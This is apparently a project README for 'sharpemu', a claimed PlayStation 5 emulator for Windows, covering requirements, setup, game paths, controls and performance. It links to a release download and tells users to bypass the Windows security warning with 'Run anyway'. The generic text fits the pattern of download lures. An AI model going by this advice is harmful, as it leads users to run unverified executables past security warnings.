# 🎮 sharpemu - Play console games on your PC

[![Download sharpemu](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/caressanoisy333/sharpemu/releases)

sharpemu brings PlayStation 5 gaming to your home computer. This software translates code from the console and runs it on a Windows operating system. It provides a way for users to experience their digital library on a desktop or laptop device.

## ⚙️ Minimum System Requirements

Your computer needs specific hardware components to run this emulator. Check your computer specs against this list before you start.

*   **Operating System:** Windows 10 or Windows 11 (64-bit).
*   **Processor:** A modern multi-core CPU with a base speed of at least 3.0 GHz.
*   **Graphics Card:** A dedicated GPU with support for DirectX 12 and at least 8 GB of video memory.
*   **System Memory:** 16 GB of RAM.
*   **Storage Space:** 2 GB of free space for the emulator, plus room for your game files.
*   **Input:** A standard game controller with XInput support or a keyboard and mouse.

## 🛠️ Setting Up Your Software

After you download the file, you must prepare it for use. Windows requires you to extract files from their compressed folder before you can launch the application.

1.  Open your Downloads folder.
2.  Right-click the zip file that you downloaded.
3.  Select the "Extract All" option.
4.  Choose a location on your computer where you want to keep the program and click "Extract."
5.  Open the new folder after the process finishes.
6.  Look for the file named `sharpemu.exe`.
7.  Double-click this file to start the emulator.

You might see a security window from Windows when you run the program for the first time. This happens because the software is new. If you see this, click "More info" and then click "Run anyway" to open the program.

## 🕹️ Configuring Your Games

The emulator requires your own game files to function. These files come from your personal physical or digital copies of games. You must store these files in a specific folder on your drive.

1.  Open the settings menu within sharpemu.
2.  Find the tab labeled "Paths."
3.  Click the "Add" button to select the folder where you store your game files.
4.  The main window will refresh and display the games it detects.
5.  Click on any title to launch your session.

## ⌨️ Controls and Input

The emulator maps console buttons to your keyboard or controller automatically. You can change these settings if you prefer a different layout.

1.  Open the settings menu.
2.  Select the "Input" tab.
3.  Pick your device from the dropdown menu.
4.  Click on each button action and press the key or controller button you want to use for that function.
5.  Save your changes.

## 📈 Improving Performance

Some games require more power than others. You can adjust the visual settings if a game runs slowly or stutters during play.

*   **Resolution Scaling:** Lowering this setting takes the load off your graphics card and makes games run smoother.
*   **Texture Filtering:** Turning this option to "Low" can boost your frame rate.
*   **Vertical Sync:** Toggle this setting if you notice tearing on your screen.

If you experience crashes, ensure your graphics card drivers are current. Visit your graphics card manufacturer website to download the latest driver software.
